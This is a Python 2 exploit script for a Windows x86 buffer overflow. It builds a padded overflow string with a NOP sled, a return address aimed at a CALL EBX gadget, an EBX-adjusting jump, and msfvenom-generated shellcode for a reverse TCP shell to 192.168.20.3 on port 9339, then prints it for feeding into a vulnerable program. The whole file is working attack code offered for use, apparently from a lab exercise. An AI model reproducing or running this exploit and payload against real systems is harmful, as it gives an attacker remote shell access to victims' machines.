#!/usr/bin/python -tt
#CALL EBX under 0x7E41BB6C
#msfvenom -p windows/shell/reverse_tcp --platform windows -a x86 LHOST=192.168.20.3 LPORT=9339 EXITFUNC=thread -f python -b "\x00\x0a\x0d\xff"
#adding 300 to ebx --> "\x83\xc3\x64"

addedEbx = "\x83\xc3\x64" * 2 + "\x83\xc3\x0c"
jmpAddedEbx = addedEbx + "\xff\xe3"

buf =  ""
buf += "\xdb\xd1\xd9\x74\x24\xf4\x5a\xb8\x93\xd7\xd0\xed\x31"
buf += "\xc9\xb1\x5b\x83\xea\xfc\x31\x42\x15\x03\x42\x15\x71"
buf += "\x22\x2c\x05\xf7\xcd\xcd\xd6\x97\x44\x28\xe7\x97\x33"
buf += "\x38\x58\x27\x37\x6c\x55\xcc\x15\x85\xee\xa0\xb1\xaa"
buf += "\x47\x0e\xe4\x85\x58\x22\xd4\x84\xda\x38\x09\x67\xe2"
buf += "\xf3\x5c\x66\x23\xe9\xad\x3a\xfc\x66\x03\xab\x89\x32"
buf += "\x98\x40\xc1\xd3\x98\xb5\x92\xd2\x89\x6b\xa8\x8d\x09"
buf += "\x8d\x7d\xa6\x03\x95\x62\x82\xda\x2e\x50\x79\xdd\xe6"
buf += "\xa8\x82\x72\xc7\x04\x71\x8a\x0f\xa2\x69\xf9\x79\xd0"
buf += "\x14\xfa\xbd\xaa\xc2\x8f\x25\x0c\x81\x28\x82\xac\x46"
buf += "\xae\x41\xa2\x23\xa4\x0e\xa7\xb2\x69\x25\xd3\x3f\x8c"
buf += "\xea\x55\x7b\xab\x2e\x3d\xd8\xd2\x77\x9b\x8f\xeb\x68"
buf += "\x44\x70\x4e\xe2\x69\x65\xe3\xa9\xe5\x4a\xce\x51\xf6"
buf += "\xc4\x59\x21\xc4\x4b\xf2\xad\x64\x04\xdc\x2a\xfc\x02"
buf += "\xdf\xe5\x46\x42\x21\x06\xb7\x4b\xe6\x52\xe7\xe3\xcf"
buf += "\xda\x6c\xf3\xf0\x0e\x18\xf9\x66\x71\x75\xe9\x75\x19"
buf += "\x84\x11\x5e\xa2\x01\xf7\xce\x04\x42\xa7\xae\xf4\x22"
buf += "\x17\x47\x1f\xad\x48\x77\x20\x67\xe1\x12\xcf\xde\x5a"
buf += "\x8b\x76\x7b\x10\x2a\x76\x51\x5d\x6c\xfc\x50\xa2\x23"
buf += "\xf5\x11\xb0\x54\x62\xda\x48\xa5\x07\xda\x22\xa1\x81"
buf += "\x8d\xda\xab\xf4\xfa\x45\x53\xd3\x78\x81\xab\xa2\x48"
buf += "\xfa\x9a\x30\xf5\x94\xe2\xd4\xf5\x64\xb5\xbe\xf5\x0c"
buf += "\x61\x9b\xa5\x29\x6e\x36\xda\xe2\xfb\xb9\x8b\x57\xab"
buf += "\xd1\x31\x8e\x9b\x7d\xc9\xe5\x9f\x7a\x35\x78\x88\x22"
buf += "\x5e\x82\x88\xd2\x9e\xe8\x08\x83\xf6\xe7\x27\x2c\x37"
buf += "\x08\xe2\x65\x5f\x83\x63\xc7\xfe\x94\xa9\x89\x5e\x95"
buf += "\x5e\x12\x50\xec\x2f\xa5\x91\x11\x26\xc2\x91\x12\x46"
buf += "\xf4\xae\xc5\x7f\x82\xf1\xd6\x3b\x8d\xef\xf2\x31\x26"
buf += "\xb6\x97\xfb\x2b\x49\x42\x3f\x52\xca\x66\xc0\xa1\xd2"
buf += "\x03\xc5\xee\x54\xf8\xb7\x7f\x31\xfe\x64\x7f\x10"

garbage = '\x90' * 8 + jmpAddedEbx + 'A' * 185 + '\x6C\xBB\x41\x7E' + '\x90' * 8 + buf + 'C' * (10000 - 204 - 12 - 389)

print garbage
